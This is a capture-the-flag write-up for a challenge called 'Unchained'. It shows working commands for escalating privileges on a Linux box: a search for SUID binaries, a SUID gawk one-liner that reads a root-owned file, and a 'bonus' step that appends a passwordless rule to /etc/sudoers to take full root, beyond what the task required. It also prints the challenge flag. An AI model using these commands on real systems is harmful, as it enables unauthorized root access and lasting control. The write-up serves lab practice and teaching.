# 1.6: Unchained

## Description

SSH into a restricted system and read a root-owned file at `/home/support/secret.txt`.

## Solution

Logged in over SSH with the provided credentials. First thing I do on any box is check what I'm working with:

```bash
id
# uid=1001(user) gid=1001(user) groups=1001(user)

ls /home/support/
# secret.txt

cat /home/support/secret.txt
# cat: /home/support/secret.txt: Permission denied
```

No sudo access either:

```bash
sudo -l
# Sorry, user has no sudo access
```

Standard move at this point is to look for SUID binaries. These run as the file owner (often root) regardless of who executes them:

```bash
find / -perm -4000 -type f 2>/dev/null
```

`gawk` showed up with the SUID bit set. `gawk` can read files, so I used it to read the protected file directly:

```bash
gawk 'BEGIN { while ((getline line < "/home/support/secret.txt") > 0) print line }'
```

That printed the flag. The SUID bit on an interpreter like gawk is essentially root file read access for anyone on the system.

As a bonus I also used gawk to write myself into sudoers:

```bash
gawk 'BEGIN { print "user ALL=(ALL) NOPASSWD:ALL" >> "/etc/sudoers" }'
sudo su
```

Not needed for the flag but nice to have full access.

Flag: `657f1cbfd9e347a0a56557cd52210563`
